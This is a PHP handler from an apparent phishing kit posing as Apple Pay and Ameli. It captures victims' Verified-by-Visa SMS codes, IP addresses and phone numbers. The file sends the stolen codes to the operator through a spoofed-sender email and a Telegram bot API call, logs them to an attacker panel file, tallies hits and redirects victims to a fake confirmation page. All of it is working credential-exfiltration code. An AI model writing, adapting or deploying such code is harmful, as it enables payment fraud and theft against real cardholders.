<?php
ob_start();
session_start();
include("../config.php");

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $vbvCode = $_POST['input_sms_code'];
    $_SESSION['vbvCode'] = $vbvCode;

    $message = '
[🦊] ApplePay by Moritz zimmerman [🦊]

🔐 Code VBV : ' . $_SESSION['vbvCode'] . '

🛒 Adresse IP : ' . $_SERVER['REMOTE_ADDR'] . '
';

    if ($mail_send == true) {
        $Subject = " 「🍓」+1 Moritz zimmerman Ameli VBV from " . $_SESSION['vbvCode'] . " | " . $_SERVER['HTTP_USER_AGENT'];
        $head = "From: Ameli <info@querty.bg>";

        mail($my_mail, $Subject, $message, $head);
    }

    if ($tlg_send == true) {
        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=" . $rez_vbv . "&text=" . urlencode("$message"));
    }

    setlocale(LC_TIME, 'fr_FR');
    date_default_timezone_set('Europe/Paris');

    $date = date("d/m/Y");
    $heure = date("H:i:s");

    $myfile = fopen("../panel/otp.txt", "a") or die("Unable to open file!");
    fwrite($myfile, "\n" . '
    <tr>
    <td width="80">
    <p align="center">'.$_SERVER['REMOTE_ADDR'].'</td>
    <td width="30">
    <p align="center">'.$_SESSION['tel'].'</td>
    <td width="40">
    <p align="center">'.$_SESSION['vbvCode'].'</td>
    <td width="40">
    <p align="center">'.$date.'</td>
    </font></td></tr>
    ');
    fclose($myfile);

    $filepath = '../panel/stats.ini';
    $data = @parse_ini_file($filepath);
    $data['sms']++;
                function update_ini_file($data, $filepath) {
                  $content = "";
                  $parsed_ini = parse_ini_file($filepath, true);
                  foreach($data as $section => $values){
                    if($section === ""){
                      continue;
                    }
                    $content .= $section ."=". $values . "\n\r";
                  }
                  if (!$handle = fopen($filepath, 'w')) {
                    return false;
                  }
                  $success = fwrite($handle, $content);
                  fclose($handle);
                }
    update_ini_file($data, $filepath);

    header('Location: ../pages/confirme.php');
    ob_end_clean();
    exit();
}

header('Location: ../pages/applepay.php');
exit();
